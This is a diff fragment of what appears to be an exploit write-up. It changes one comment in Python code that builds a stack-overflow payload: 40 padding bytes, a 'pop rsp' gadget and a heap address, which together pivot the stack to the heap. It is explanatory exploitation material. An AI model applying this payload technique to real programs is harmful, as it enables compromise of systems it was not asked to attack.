@@ -163,7 +163,7 @@ It also pops three more registers, we just put dummy values in them.
 ```python
 pop_rsp = rop.find_gadget(['pop rsp'])[0]
 
-stack_payload  = b'A'*40 # overflow buffer
+stack_payload  = b'A'*40
 stack_payload += p64(pop_rsp)
 stack_payload += p64(heap_address)
 
